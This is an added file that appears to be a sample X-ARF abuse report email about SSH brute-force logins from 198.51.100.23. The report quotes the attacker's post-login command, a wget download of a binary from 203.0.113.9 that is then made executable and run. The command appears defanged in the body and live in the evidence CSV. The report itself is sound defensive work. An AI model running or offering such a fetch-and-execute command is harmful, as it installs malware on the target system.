@@ -1,0 +1,56 @@
+To: abuse@example.net
+Subject: Attack from 198.51.100.23 (AS64500)
+X-ARF: YES
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============1234567890123456789=="
+
+--===============1234567890123456789==
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+
+Hello,
+
+The address below attacked a monitored system.
+Times are UTC. Source ports are included.
+
+198.51.100.23 (AS64500, EXAMPLE-NET)
+  2026-10-30T14:02:11Z to 2026-10-30T15:40:02Z, TCP/22 (ssh)
+  - Login attempts: 412 (users: root, admin, ubnt)
+  - 2026-10-30T15:39:58Z Commands:
+      cd /tmp; wget hxxp://203.0.113[.]9/bins/x86; chmod +x x86; ./x86
+
+Please look into it.
+
+Contact: reports@example.org
+
+Regards, a network volunteer
+
+--===============1234567890123456789==
+Content-Type: text/plain; charset=us-ascii; name="report.txt"
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename="report.txt"
+
+Reported-From: reports@example.org
+Category: abuse
+Report-Type: login-attack
+Service: ssh
+Port: 22
+Version: 0.2
+User-Agent: reporter/1.0
+Date: Fri, 30 Oct 2026 14:02:11 +0000
+Source-Type: ipv4
+Source: 198.51.100.23
+Attachment: text/plain
+Schema-URL: http://www.x-arf.org/schema/abuse_login-attack_0.1.2.json
+Occurrences: 415
+
+--===============1234567890123456789==
+Content-Type: text/plain; charset=us-ascii; name="evidence.txt"
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename="evidence.txt"
+
+source,asn,network,country,time,protocol,src_port,port,count,details,sha256
+198.51.100.23,64500,EXAMPLE-NET,NL,2026-10-30T14:02:11Z,tcp,41022,22,412,"Login attempts; users: root,admin,ubnt",
+198.51.100.23,64500,EXAMPLE-NET,NL,2026-10-30T15:39:58Z,tcp,41022,22,1,Commands; cd /tmp; wget http://203.0.113.9/bins/x86; chmod +x x86; ./x86,
+
+--===============1234567890123456789==--
